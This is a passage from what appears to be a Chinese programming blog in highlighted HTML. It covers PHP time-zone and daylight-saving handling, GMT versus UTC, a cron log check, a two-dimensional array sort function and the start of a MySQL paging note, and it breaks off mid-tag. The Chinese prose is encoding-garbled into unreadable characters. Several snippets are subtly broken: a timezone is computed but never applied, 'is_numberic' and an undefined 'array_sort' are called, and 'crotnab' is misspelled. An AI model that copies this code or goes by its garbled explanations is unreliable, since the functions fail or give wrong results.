‡å‡†æ—¶é—´ï¼ˆå³æ—¶åŒºæ•°ï¼‰ç›¸å‡å°±æ˜¯æ—¶å·®ï¼Œæ—¶åŒºçš„æ•°å€¼å¤§çš„æ—¶é—´æ—©ã€‚æ¯”å¦‚ä¸­å›½æ˜¯ä¸œå…«åŒº(+<span class="number">8</span>)ï¼Œç¾å›½ä¸œéƒ¨æ˜¯è¥¿äº”åŒº(<span class="number">-5</span>)ï¼Œä¸¤åœ°çš„æ—¶å·®æ˜¯<span class="number">13</span>å°æ—¶ï¼ŒåŒ—äº¬æ¯”çº½çº¦è¦æ—©<span class="number">13</span>ä¸ªå°æ—¶ï¼›å¦‚æœæ˜¯ç¾å›½å®è¡Œå¤ä»¤æ—¶çš„æ—¶æœŸï¼Œç›¸å·®<span class="number">12</span>å°æ—¶ã€‚</span><br><span class="line">è‹±å›½ä¸åŒ—äº¬æ—¶é—´çš„æ—¶å·®æ˜¯<span class="number">8</span>ä¸ªå°æ—¶ï¼Œä½†å…¶ä¸­è‹±å›½å±äºå¤ä»¤æ—¶å›½å®¶ï¼Œå¦‚æœæ˜¯å¤ä»¤æ—¶ï¼ˆæ¯å¹´<span class="number">3</span>æœˆæœ€åä¸€ä¸ªæ˜ŸæœŸæ—¥è‡³<span class="number">10</span>æœˆæœ€åä¸€ä¸ªæ˜ŸæœŸæ—¥ï¼‰æœŸé—´ï¼Œä¸­å›½å’Œè‹±å›½çš„æ—¶å·®æ˜¯<span class="number">7</span>ä¸ªå°æ—¶ã€‚</span><br><span class="line"></span><br><span class="line"><span class="number">1884</span>å¹´åœ¨åç››é¡¿å¬å¼€çš„ä¸€æ¬¡å›½é™…å­åˆçº¿ä¼šè®®ä¸Šï¼Œè§„å®šå°†å…¨çƒåˆ’åˆ†ä¸º<span class="number">24</span>ä¸ªæ—¶åŒºï¼ˆä¸œã€è¥¿å„<span class="number">12</span>ä¸ªæ—¶åŒºï¼‰ï¼Œä¸”åŒæ—¶è§„å®šäº†è‹±å›½ä¸ºä¸ºæœ¬åˆå­åˆçº¿ï¼Œå³é›¶åº¦ç»çº¿ã€‚ä¸œ<span class="number">1</span><span class="number">-12</span>åŒºï¼Œè¥¿<span class="number">1</span><span class="number">-12</span>åŒºï¼Œæ¯ä¸ªæ—¶åŒºæ¨ªè·¨ç»åº¦<span class="number">15</span>åº¦ï¼Œæ—¶é—´æ­£å¥½æ˜¯<span class="number">1</span>å°æ—¶ã€‚æœ€åçš„ä¸œã€è¥¿ç¬¬<span class="number">12</span>åŒºå„è·¨ç»åº¦<span class="number">7.5</span>åº¦ï¼Œä»¥ä¸œã€è¥¿ç»<span class="number">180</span>åº¦ä¸ºç•Œã€‚</span><br><span class="line">ä¸­å›½é¦–éƒ½åŒ—å±äºä¸œå…«åŒºï¼Œæ‰€ä»¥å¯¹æ¯”è‹±å›½çš„é›¶åº¦ç»çº¿ï¼Œä¸¤è€…ä¹‹é—´ç›¸å·®äº†<span class="number">8</span>ä¸ªå°æ—¶ã€‚ä½†å› ä¸ºè‹±å›½å®è¡Œå¤ä»¤æ—¶ï¼ˆæ¯å¹´<span class="number">3</span>æœˆæœ€åä¸€ä¸ªæ˜ŸæœŸæ—¥è‡³<span class="number">10</span>æœˆæœ€åä¸€ä¸ªæ˜ŸæœŸæ—¥ï¼‰ï¼Œåˆ™è‹±å›½åœ¨å¤©äº®æ—©çš„å¤å­£äººä¸ºå°†æ—¶é—´è°ƒå¿«ä¸€å°æ—¶å¯ä»¥ä½¿äººæ—©èµ·æ—©ç¡ï¼Œå‡å°‘ç…§æ˜é‡ã€‚é‚£ä¹ˆè‹±å›½ä¸åŒ—äº¬æ—¶é—´ä¹‹é—´æ—¶å·®æ˜¯<span class="number">7</span>ä¸ªå°æ—¶ã€‚</span><br><span class="line"></span><br><span class="line"><span class="comment">//è·å–ç¾å›½å†¬å¤æ—¶ä»¤ //åˆ¤æ–­å½“å‰æ˜¯å¦ä¸ºå¤ä»¤æ—¶ï¼Œä¸ºçœŸè¿”å›1ï¼Œå¦åˆ™ä¸º0</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getAmericanSeason</span>(<span class="params">$market</span>)</span>&#123;</span><br><span class="line">	$localzone = date(<span class="string">"e"</span>);</span><br><span class="line">	<span class="comment">//date_default_timezone_set('US/Pacific-New');</span></span><br><span class="line">	$timezone = in_array($market, array(<span class="string">'LME'</span>, <span class="string">'LIFFE'</span>)) ? <span class="string">'Europe/London'</span> : <span class="string">'US/Pacific-New'</span>;</span><br><span class="line">	$season = date(<span class="string">"I"</span>);</span><br><span class="line">	date_default_timezone_set($localzone);</span><br><span class="line">	<span class="keyword">return</span> $season;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//åˆ¤æ–­ç¾å›½é‚£ä¸ªæ—¶é—´æ®µæ˜¯å¦ä¸ºå¤ä»¤æ—¶https://gist.github.com/flowerains </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_dst</span>(<span class="params">$timestamp</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $timezone = date(<span class="string">'e'</span>); <span class="comment">//è·å–å½“å‰ä½¿ç”¨çš„æ—¶åŒº</span></span><br><span class="line">    date_default_timezone_set(<span class="string">'US/Pacific-New'</span>); <span class="comment">//å¼ºåˆ¶è®¾ç½®æ—¶åŒº</span></span><br><span class="line">    $dst = date(<span class="string">'I'</span>,$timestamp); <span class="comment">//åˆ¤æ–­æ˜¯å¦å¤ä»¤æ—¶</span></span><br><span class="line">    date_default_timezone_set($timezone); <span class="comment">//è¿˜åŸæ—¶åŒº</span></span><br><span class="line">    <span class="keyword">return</span> $dst; <span class="comment">//è¿”å›ç»“æœ</span></span><br><span class="line">&#125;</span><br><span class="line">print gmdate(<span class="string">"Y-m-d\TH:i:s\Z"</span>);</span><br><span class="line">$date_utc = <span class="keyword">new</span> \DateTime(<span class="string">"now"</span>, <span class="keyword">new</span> \DateTimeZone(<span class="string">"UTC"</span>));</span><br><span class="line">https:<span class="comment">//stackoverflow.com/questions/8655515/get-utc-time-in-php/18808833</span></span><br><span class="line">echo $date_utc-&gt;format(\DateTime::RFC850); # Saturday, 18-Apr-15 03:23:46 UTC</span><br><span class="line">echo gmdate (<span class="string">"l d F Y H:i:s"</span>).<span class="string">" GMT"</span>; <span class="comment">//è¾“å‡º: Wednesday 09 April 2014 03:53:36 GMT</span></span><br><span class="line">GMTæ ¼æ—å¨æ²»æ—¶é—´å’Œæœ¬åœ°çš„æ—¶é—´æ˜¯æœ‰æ—¶å·®çš„, æˆ‘ä»¬çŸ¥é“phpæŒ‡å®šæ—¶åŒºåç”¨date() å‡½æ•°è·å–çš„æ˜¯æœ¬åœ°æ—¶é—´, å¦‚æœæƒ³è·å–æ ‡å‡†çš„GMT æ ¼æ—å¨æ²»æ—¶é—´å°±è¦ç”¨gmdate()å‡½æ•°äº†</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Converts a local Unix timestamp to GMT</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param   int Unix timestamp</span></span><br><span class="line"><span class="comment">     * @return  int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">local_to_gmt</span>(<span class="params">$time = <span class="string">''</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($time === <span class="string">''</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $time = time();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> mktime(</span><br><span class="line">            gmdate(<span class="string">'G'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'i'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'s'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'n'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'j'</span>, $time),</span><br><span class="line">            gmdate(<span class="string">'Y'</span>, $time)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">   date_default_timezone_set(<span class="string">'Asia/Calcutta'</span>);</span><br><span class="line">   </span><br><span class="line">   $current_date = date(<span class="string">"Y/m/d g:i A"</span>);</span><br><span class="line">   </span><br><span class="line">   $ist_date = DateTime::createFromFormat(</span><br><span class="line">                           <span class="string">'"Y/m/d g:i A"'</span>,</span><br><span class="line">                           $current_date,</span><br><span class="line">                           <span class="keyword">new</span> DateTimeZone(<span class="string">'Asia/Calcutta'</span>)</span><br><span class="line">                       );</span><br><span class="line">   </span><br><span class="line">   $utc_date = clone $ist_date;</span><br><span class="line">   $utc_date-&gt;setTimeZone(<span class="keyword">new</span> DateTimeZone(<span class="string">'UTC'</span>));</span><br><span class="line">   </span><br><span class="line">   echo <span class="string">'UTC:  '</span> . $utc_date-&gt;format(<span class="string">'Y-m-d g:i A'</span>); </span><br><span class="line">    $time = gmmktime();</span><br><span class="line">    echo date(<span class="string">"Y-m-d H:i:s"</span>, $time); </span><br><span class="line">    date_default_timezone_set(<span class="string">"UTC"</span>);</span><br><span class="line">date(<span class="string">"Y-m-d H:i:s"</span>, time() - date(<span class="string">"Z"</span>))</span><br><span class="line">date_default_timezone_set(<span class="string">'Australia/Brisbane'</span>);</span><br><span class="line">echo gmdate(<span class="string">'c'</span>);<span class="comment">///2018-01-12T16:10:11+00:00</span></span><br><span class="line">æœ€å¥½æ˜¯ä¸€ç›´ä½¿ç”¨ UTC æ—¶é—´ã€‚æœåŠ¡å™¨ä½¿ç”¨ï¼Œè‡ªå·±å¼€å‘é»˜è®¤ä¹Ÿæ˜¯ï¼Œç„¶åå­˜å…¥æ•°æ®åº“ä¹Ÿæ˜¯ï¼Œè¿™æ ·çš„è¯æŠŠæ•°æ®æ˜¾ç¤ºç»™ç”¨æˆ·çœ‹çš„è¯è½¬æ¢ä¸ºé€‚å½“æ—¶åŒºçš„æ—¥æœŸå’Œæ—¶é—´å°±è¡Œäº†ã€‚</span><br><span class="line">æ—¶é—´æˆ³æ˜¯æŒ‡æ ¼æ—å°¼æ²»æ—¶é—´ï¼ˆGMTï¼‰<span class="number">1970</span>å¹´<span class="number">01</span>æœˆ<span class="number">01</span>æ—¥<span class="number">00</span>æ—¶<span class="number">00</span>åˆ†<span class="number">00</span>ç§’åˆ°å½“å‰æ—¶é—´çš„æ€»ç§’æ•°ã€‚https:<span class="comment">//www.php.net/manual/en/timezones.php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">st_date</span>(<span class="params">$format,$timestamp = false</span>) </span>&#123;</span><br><span class="line">  $timestamp = is_numberic($timestamp) ? $timestamp : time();</span><br><span class="line">  <span class="keyword">return</span> gmdate($format,$timestamp + <span class="number">8</span>*<span class="number">3600</span>);</span><br><span class="line">&#125;</span><br><span class="line">è¿™æ ·å°±å¯ä»¥ä¿è¯è¿™æ®µä»£ç æ— è®ºåœ¨å“ªé‡Œï¼Œéƒ½å¯ä»¥è¾“å‡ºä¸œå…«åŒºçš„æ—¶é—´ã€‚</span><br><span class="line">$triggerOn = <span class="string">'04/01/2013 03:08 PM'</span>;</span><br><span class="line">$user_tz = <span class="string">'America/Los_Angeles'</span>;</span><br><span class="line"></span><br><span class="line">echo $triggerOn; <span class="comment">// echoes 04/01/2013 03:08 PM</span></span><br><span class="line"></span><br><span class="line">$schedule_date = <span class="keyword">new</span> DateTime($triggerOn, <span class="keyword">new</span> DateTimeZone($user_tz) );</span><br><span class="line">$schedule_date-&gt;setTimeZone(<span class="keyword">new</span> DateTimeZone(<span class="string">'UTC'</span>));</span><br><span class="line">$triggerOn =  $schedule_date-&gt;format(<span class="string">'Y-m-d H:i:s'</span>);</span><br><span class="line"></span><br><span class="line">echo $triggerOn; <span class="comment">// echoes 2013-04-01 22:08:00</span></span><br><span class="line"></span><br><span class="line">æ ¼æ—å¨æ²»æ—¶é—´ï¼ˆGreenwich Mean Time, GMTï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">é€šç”¨åè°ƒæ—¶é—´ï¼ˆUniversal Time Coordinated, UTCï¼‰ã€‚UTCçš„è¡¨ç¤ºæ–¹å¼ä¸ºï¼šå¹´ï¼ˆyï¼‰ã€æœˆï¼ˆmï¼‰ã€æ—¥ï¼ˆdï¼‰ã€æ—¶ï¼ˆhï¼‰ã€åˆ†ï¼ˆminï¼‰ã€ç§’ï¼ˆsï¼‰ï¼Œå‡ç”¨æ•°å­—è¡¨ç¤ºã€‚è‹¥ä»¥ã€Œä¸–ç•Œæ ‡å‡†æ—¶é—´ã€çš„è§’åº¦æ¥è¯´ï¼ŒUTCæ¯”GMTæ¥å¾—æ›´åŠ ç²¾å‡†ï¼š *UTC = GMT +<span class="regexp">/- 0.9* ã€‚</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">æœ¬åœ°æ—¶é—´(locale time)ï¼šå¾ˆæ˜¾ç„¶ï¼Œæœ¬åœ°æ—¶é—´è·Ÿæ—¶åŒº(timezone)æœ‰å…³ï¼š *æœ¬åœ°æ—¶é—´ = UTC + æ—¶åŒº* ã€‚ä¾‹å¦‚ï¼Œä¸­å›½åŒ—äº¬æ ‡å‡†æ—¶é—´ï¼ˆå¿½ç•¥GMTå’ŒUTCçš„å·®å¼‚ï¼‰ï¼š *CST = GMT + 8 = UTC + 8* ã€‚</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">Unixæ—¶é—´æˆ³(Unix timestamp)ï¼Œåˆç§° Unixæ—¶é—´(Unix time) æˆ– POSIXæ—¶é—´(POSIX time) ï¼Œå®ƒä»æ ¼æ—å¨æ²»æ—¶é—´1970å¹´01æœˆ01æ—¥00æ—¶00åˆ†00ç§’èµ·è‡³ç°åœ¨çš„æ€»ç§’æ•°ã€‚</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">$usersNow = new DateTime('now', new DateTimeZone("+8"));/</span><span class="regexp">/php5.5+</span></span><br><span class="line"><span class="regexp">echo $usersNow-&gt;format(DateTime::RFC3339);/</span><span class="regexp">/2019-04-18T17:16:12+08:00</span></span><br><span class="line"><span class="regexp">$usersNow = new DateTime('now', new DateTimeZone('+0300'));</span></span><br><span class="line"><span class="regexp">$original = new DateTime("now", new DateTimeZone('UTC'));</span></span><br><span class="line"><span class="regexp">$timezoneName = timezone_name_from_abbr("", 3*3600, false);</span></span><br><span class="line"><span class="regexp">$modified = $original-&gt;setTimezone(new DateTimezone($timezoneName));</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">$date = date_create('2000-01-01', timezone_open('Pacific/</span>Nauru<span class="string">'));</span></span><br><span class="line"><span class="string">echo date_format($date, '</span>Y-m-d H:i:sP<span class="string">') . "\n";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">date_timezone_set($date, timezone_open('</span>Pacific/Chatham<span class="string">'));</span></span><br><span class="line"><span class="string">echo date_format($date, '</span>Y-m-d H:i:sP<span class="string">') . "\n";</span></span><br><span class="line"><span class="string">ä¸ºä»€ä¹ˆè¦æ—¶é—´æˆ³ï¼Ÿå› ä¸ºä»0å¼€å§‹è¿è¡Œçš„ç§’æ•°æ°¸è¿œç›¸ç­‰ï¼Œå³ä½¿å‡ºç°æ¶¦ç§’ï¼Œä¹Ÿå¹¶ä¸å½±å“æ—¶é—´æˆ³ã€‚</span></span><br><span class="line"><span class="string">phpåœ¨ä½¿ç”¨dateå‡½æ•°çš„æ—¶å€™ï¼Œä¼šä¾ç…§æ‰€åœ¨æ—¶åŒºå»è¿›è¡Œè®¡ç®—ã€‚date()è¿›è¡Œè¾“å‡ºçš„æ—¶é—´ï¼Œå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„æœ¬åœ°æ—¶é—´ã€‚</span></span><br><span class="line"><span class="string">å¯å˜ï¼šdate()ä¸å¯å˜ï¼štime()ã€gmdate()</span></span><br><span class="line"><span class="string">// æ–¹æ³•1date('</span>Y-m-d H:i:s<span class="string">',strtotime(gmdate('</span>Y-m-d H:i:s<span class="string">').'</span> +<span class="number">8</span> hours<span class="string">'));</span></span><br><span class="line"><span class="string">// æ–¹æ³•2ï¼ˆæ¨èï¼‰gmdate('</span>Y-m-d H:i:s<span class="string">',time() + 8*3600);</span></span><br><span class="line"><span class="string">$gmt_date = date('</span>Y-m-d H:i:s<span class="string">',time() - date('</span>Z<span class="string">'));</span></span><br><span class="line"><span class="string">$local_time = gmdate('</span>Y-m-d H:i:s<span class="string">',time() + date('</span>Z<span class="string">'));</span></span><br><span class="line"><span class="string">ä½†è¿™å’Œ$local_time = date('</span>Y-m-d H:i:s<span class="string">');æ²¡æœ‰ä»»ä½•ç»“æœä¸Šçš„åŒºåˆ«ã€‚</span></span><br><span class="line"><span class="string">åªä¿å­˜timestampï¼Œä¹Ÿå°±æ˜¯time()ï¼Œå®ƒçš„å€¼æ˜¯å›ºå®šçš„ï¼Œä¸éšç€æ—¶åŒºçš„è°ƒæ•´è€Œæ”¹å˜ï¼Œå³ä½¿æ›´æ¢äº†æœåŠ¡å™¨ï¼Œå®ƒçš„è¯¯å·®ä¹Ÿå¾ˆå°ï¼Œæ‰€ä»¥æœ‰åˆ©äºä»Šåå°†ç¨‹åºåˆ†å‘éƒ¨ç½²åˆ°ä¸åŒçš„æœåŠ¡å™¨ä¸Šé¢ã€‚</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">          function toTimeZone($src, $from_tz = '</span>America/Denver<span class="string">', $to_tz = '</span>Asia/Shanghai<span class="string">', $fm = '</span>Y-m-d H:i:s<span class="string">') &#123;</span></span><br><span class="line"><span class="string">              $datetime = new DateTime($src, new DateTimeZone($from_tz));</span></span><br><span class="line"><span class="string">              $datetime-&gt;setTimezone(new DateTimeZone($to_tz));</span></span><br><span class="line"><span class="string">              return $datetime-&gt;format($fm);</span></span><br><span class="line"><span class="string">          &#125;                                                     </span></span><br><span class="line"><span class="string">$time_zone = "GMT+8";</span></span><br><span class="line"><span class="string">$time = time();</span></span><br><span class="line"><span class="string">$date = date_create(date("Y-m-d H:i", $time), timezone_open('</span>UTC<span class="string">'));</span></span><br><span class="line"><span class="string">$date = date_timezone_set($date, timezone_open($time_zone));</span></span><br><span class="line"><span class="string">$date = date_format($date, '</span>Y-m-d H:i<span class="string">');</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo date("Y-m-d H:i:s"); </span></span><br><span class="line"><span class="string">// date() è¿”å›çš„æ˜¯:ã€€å½“å‰(è¿™ä¸€åˆ» time()å‡½æ•°æ‰§è¡Œ/è¿”å›æ—¶) GMTæ ‡å‡†æ—¶é—´ çš„"æœ¬åœ°åŒ–æ—¶é—´" çš„è‡ªå®šä¹‰æ ¼å¼æ—¶é—´</span></span><br><span class="line"><span class="string">// date()è·Ÿphpç³»ç»Ÿè®¾ç½®çš„æ—¶åŒºæœ‰å…³!</span></span><br><span class="line"><span class="string">echo gmdate("Y-m-d H:i:s");</span></span><br><span class="line"><span class="string">// gmdate() è¿”å›çš„æ˜¯:ã€€å½“å‰(è¿™ä¸€åˆ» time()å‡½æ•°æ‰§è¡Œ/è¿”å›æ—¶) GMTæ ‡å‡†æ—¶é—´  çš„è‡ªå®šä¹‰æ ¼å¼æ—¶é—´</span></span><br><span class="line"><span class="string">// gmdate() è·Ÿä½ ç°åœ¨æ‰€å¤„çš„ä½ç½®æ— å…³, è·Ÿphpç³»ç»Ÿè®¾ç½®çš„æ—¶åŒºæ— å…³!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ä¹Ÿå°±è¯´ï¼Œã€€date()å’Œgmdate()çš„åŒºåˆ«, ä»…ä»…åœ¨äº å¤„ç†çš„æ—¶é—´ æ˜¯ä¸åŒçš„!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">INSERT INTO `table` (id, time) VALUES(NULL, UNIX_TIMESTAMP()); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// or http://cn.voidcc.com/question/p-fvgnwppc-bc.html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$time = time(); </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$query = "INSERT INTO `table` (id, time) VALUES(NULL, $time); </span></span><br><span class="line"><span class="string">å¦‚æœä½ æƒ³ä»æ•°æ®åº“ä¸­é€‰æ‹©å®ƒä½œä¸ºä¸€ä¸ªDATETIMEï¼Œä½ å¯ä»¥è¿™æ ·åšï¼š</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">SELECT *, FROM_UNIXTIME(time) as dt FROM `table` WHERE 1 </span></span><br><span class="line"><span class="string">äº§ç”Ÿçš„dtæ ä¼šæ ¼å¼ä¸ºyyyy-MM-dd hh:mm:ssã€‚</span></span><br></pre></td></tr></table></figure>
<h3 id="You-have-new-mail-in-var-spool-mail-root"><a href="#You-have-new-mail-in-var-spool-mail-root" class="headerlink" title="You have new mail in /var/spool/mail/root"></a>You have new mail in /var/spool/mail/root</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">tac /<span class="keyword">var</span>/spool/mail/root |more</span><br><span class="line">PHP Fatal error:  require_once(): Failed opening required <span class="string">'../Redis/RedisManager.php'</span> (include_path=<span class="string">'.:/usr/local/lib/php</span></span><br><span class="line"><span class="string">/:/usr/share/pear:/usr/share/php'</span>) <span class="keyword">in</span> /cron/test.php on line <span class="number">8</span></span><br><span class="line"></span><br><span class="line">crotnab -e</span><br><span class="line">*<span class="regexp">/5 * * * 1-6 cd /</span>cron/;<span class="regexp">/usr/</span>local/bin/php /cron/test.php -t <span class="number">15</span> </span><br><span class="line"></span><br><span class="line">tail -f /<span class="keyword">var</span>/log/cron</span><br><span class="line">Apr <span class="number">18</span> <span class="number">18</span>:<span class="number">00</span>:<span class="number">02</span> xk<span class="number">-6</span><span class="number">-240</span>-a8 CROND[<span class="number">23941</span>]: (root) CMD (<span class="regexp">/usr/</span>lib64/sa/sa1 <span class="number">1</span> <span class="number">1</span>)</span><br><span class="line"> Apr <span class="number">18</span> <span class="number">18</span>:<span class="number">00</span>:<span class="number">02</span> xk<span class="number">-6</span><span class="number">-240</span>-a8 CROND[<span class="number">23942</span>]: (root) CMD (cd /cron/;<span class="regexp">/usr/</span>local/bin/php /cron/test.php -t <span class="number">15</span></span><br></pre></td></tr></table></figure>
<h3 id="å¯¹äºŒç»´æ•°ç»„è¿›è¡Œæ’åº"><a href="#å¯¹äºŒç»´æ•°ç»„è¿›è¡Œæ’åº" class="headerlink" title="å¯¹äºŒç»´æ•°ç»„è¿›è¡Œæ’åº"></a>å¯¹äºŒç»´æ•°ç»„è¿›è¡Œæ’åº</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å¯¹äºŒç»´æ•°ç»„è¿›è¡ŒæŒ‰å­—æ®µæ’åº</span></span><br><span class="line"><span class="comment"> * @param array $array è¦æ’åºçš„äºŒç»´æ•°ç»„</span></span><br><span class="line"><span class="comment"> * @param bool $orderby æ ¹æ®è¯¥å­—æ®µï¼ˆäºŒç»´æ•°ç»„å•ä¸ªå…ƒç´ ä¸­çš„é”®åï¼‰æ’åº</span></span><br><span class="line"><span class="comment"> * @param string $order æ’åºæ–¹å¼ï¼Œasc:å‡åºï¼›desc:é™åºï¼ˆé»˜è®¤ï¼‰</span></span><br><span class="line"><span class="comment"> * @param string $children å­å…ƒç´ å­—æ®µï¼ˆé”®åï¼‰ï¼Œå½“å…ƒç´ å«æœ‰è¯¥å­—æ®µæ—¶ï¼Œè¿›è¡Œé€’å½’æ’åº</span></span><br><span class="line"><span class="comment"> * @return array</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">array_orderby</span>(<span class="params">&amp;$array,$orderby = null,$order = <span class="string">'desc'</span>,$children = false</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>($orderby == <span class="literal">null</span>)</span><br><span class="line">    <span class="keyword">return</span> $array;</span><br><span class="line">  $key_value = $new_array = array();</span><br><span class="line"></span><br><span class="line">  foreach($array <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">    $key_value[$k] = $v[$orderby];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($order == <span class="string">'asc'</span>) &#123;</span><br><span class="line">    asort($key_value);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    arsort($key_value);</span><br><span class="line">  &#125;</span><br><span class="line">  reset($key_value);</span><br><span class="line"></span><br><span class="line">  foreach($key_value <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">    $new_array[$k] = $array[$k];</span><br><span class="line">    <span class="comment">// å¦‚æœæœ‰children</span></span><br><span class="line">    <span class="keyword">if</span>($children &amp;&amp; isset($new_array[$k][$children])) &#123;</span><br><span class="line">      $new_array[$k][$children] = array_sort($new_array[$k][$children]);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  $new_array = array_values($new_array); <span class="comment">// ä½¿é”®åä»0å¼€å§‹å‡åºæ’åˆ—</span></span><br><span class="line">  $array = $new_array;</span><br><span class="line">  <span class="keyword">return</span> $new_array;</span><br><span class="line">&#125;</span><br><span class="line">$a = array(</span><br><span class="line">  array(<span class="string">'name'</span> =&gt; <span class="string">'Kenvi'</span>,<span class="string">'age'</span> =&gt; <span class="number">18</span>),</span><br><span class="line">  array(<span class="string">'name'</span> =&gt; <span class="string">'Nance'</span>,<span class="string">'age'</span> =&gt; <span class="number">21</span>),</span><br><span class="line">  .....</span><br><span class="line">);</span><br><span class="line">array_orderby($a,<span class="string">'age'</span>,<span class="string">'asc'</span>); <span class="comment">// æˆ–è€…$a = array_orderby($a,'age','asc');</span></span><br><span class="line">$b = array(</span><br><span class="line">  array(</span><br><span class="line">    <span class="string">'id'</span> =&gt; <span class="number">12</span>,<span class="string">'count'</span> =&gt; <span class="number">36</span>,</span><br><span class="line">    <span class="string">'children'</span> =&gt; array(</span><br><span class="line">      array(<span class="string">'id'</span> =&gt; <span class="number">76</span>,<span class="string">'count'</span> =&gt; <span class="number">40</span>),</span><br><span class="line">      array(<span class="string">'id'</span> =&gt; <span class="number">98</span>,<span class="string">'count'</span> =&gt; <span class="number">100</span>)</span><br><span class="line">    )</span><br><span class="line">  ),</span><br><span class="line">  array(<span class="string">'id'</span> =&gt; <span class="number">19</span>,<span class="string">'count'</span> =&gt; <span class="number">87</span>),</span><br><span class="line">  ......</span><br><span class="line">);</span><br><span class="line">array_orderby($b,<span class="string">'count'</span>,<span class="string">'desc'</span>,<span class="string">'children'</span>);</span><br><span class="line">https:<span class="comment">//www.tangshuang.net/2077.html</span></span><br></pre></td></tr></table></figure>
<h3 id="mysql-orderby-limit-ç¿»é¡µæ•°æ®é‡å¤"><a href="#mysql-orderby-limit-ç¿»é¡µæ•°æ®é‡å¤" class="headerlink" title="mysql orderby limit ç¿»é¡µæ•°æ®é‡å¤"></a>mysql orderby limit ç¿»é¡µæ•°æ®é‡å¤</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">`post_title`</span>,<span class="string">`post_date`</span> FROM post WHERE <span class="string">`post_status`</span>=<span 